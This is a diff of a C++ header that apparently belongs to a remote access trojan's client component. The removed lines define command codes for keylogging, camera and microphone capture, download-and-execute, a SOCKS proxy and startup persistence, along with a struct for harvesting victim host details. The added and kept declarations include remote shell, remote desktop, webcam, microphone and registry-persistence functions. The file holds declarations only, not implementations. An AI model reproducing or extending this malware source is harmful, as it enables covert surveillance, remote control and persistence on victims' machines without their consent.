@@ -1,58 +1,8 @@
 #pragma once
+#include "kernel_common.h"
 #include "EventHandler.h"
-	
-#define KNEL	('K'|('N'<<8)|('E'<<16)|('L'<<24))
 
 
-
-#define KNEL_LOGIN (0xee01)
-//
-#define KNEL_READY			(0x4552)
-
-#define KNEL_POWER_REBOOT	(0xee02)
-#define KNEL_POWER_SHUTDOWN	(0xee03)
-#define KNEL_RESTART		(0xea04)
-
-
-#define KNEL_EDITCOMMENT	(0xee04)
-#define KNEL_EDITCOMMENT_OK	(0xee05)
-
-#define KNEL_UPLOAD_MODULE_FROMDISK		(0xee08)
-#define KNEL_UPLOAD_MODULE_FORMURL		(0xee09)
-
-
-
-#define KNEL_ERROR			(0xea08)
-
-
-#define KNEL_MODULE_BUSY				(0xdd00)
-#define KNEL_CMD						(0xdd01)
-#define KNEL_CHAT						(0xdd02)
-#define KNEL_FILEMGR					(0xdd03)
-#define KNEL_DESKTOP					(0xdd04)
-#define KNEL_CAMERA						(0xdd05)
-#define KNEL_MICROPHONE					(0xdd06)
-#define KNEL_DOWNANDEXEC				(0xdd07)
-#define KNEL_EXIT						(0xdd08)
-#define KNEL_KEYBD_LOG					(0xdd09)
-
-
-#define KNEL_UTILS_COPYTOSTARTUP		(0xdd0a)
-#define KNEL_UTILS_WRITE_REG			(0xdd0b)
-
-
-#define KNEL_PROXY_SOCKSPROXY			(0xdd0c)
-#define KNEL_UTILS_OPEN_WEBPAGE			(0xdd0d)
-#define KNEL_PROCESSMANAGER				(0xdd0e)
-
-
-
-//获取模块信息....
-#define KNEL_GETMODULE_INFO	(0xea05)
-#define KNEL_MODULE_INFO	(0xea07)
-
-#define KNEL_MODULE_CHUNK_GET	(0xfa00)
-#define KNEL_MODULE_CHUNK_DAT	(0xfa01)
 
 
 //Notify Message:
@@ -67,25 +17,13 @@
 
 #define WM_KERNEL_GET_MODULE_PATH		(WM_USER + 407)
 
+
 class CKernelSrv :
 	public CEventHandler
 {
-public:
-	typedef struct LoginInfo
-	{
-		TCHAR szPrivateIP[128];				//
-		TCHAR szHostName[128];
-		TCHAR szUser[128];
-		TCHAR szOsName[128];
-		TCHAR szInstallDate[128];
-		TCHAR szCPU[128];
-		TCHAR szDisk_RAM[128];
-		DWORD dwHasCamera;
-		DWORD dwPing;
-		TCHAR szComment[256];
 
-	}LoginInfo;
-	
+private:
+
 	//module transport.
 	TCHAR	m_szModulePath[MAX_PATH];
 	TCHAR	m_szCurrentModuleName[MAX_PATH];
@@ -93,7 +31,10 @@ public:
 	UINT64  m_LastGetTime;
 	BYTE *  m_lpBuffer;
 
+	BOOL    m_bLogin;
 private:
+
+	 
 	void OnClose() ;	
 	void OnOpen();		
 
@@ -118,13 +59,12 @@ public:
 	void Restart();
 
 	void OnError(TCHAR * Error);
-	void UploadModuleFromDisk(TCHAR* Path);
-	void UploadModuleFromUrl(TCHAR* Url);
 
 	void BeginCmd();
 	void BeginChat();
 	void BeginFileMgr();
-	void BeginRemoteDesktop();
+	void BeginRemoteDesktop_gdi();
+	void BeginRemoteDesktop_dxgi();
 	void BeginCamera();
 	void BeginMicrophone();
 	void BeginDownloadAndExec(TCHAR szUrl[]);
@@ -135,6 +75,7 @@ public:
 	void UtilsWriteStartupReg();
 	void UtilsCopyToStartupMenu();
 	void UtilsOpenWebpage(TCHAR * szUrl);
+
 
 	//----------------------------------------------
 	CKernelSrv(CClient *pClient);
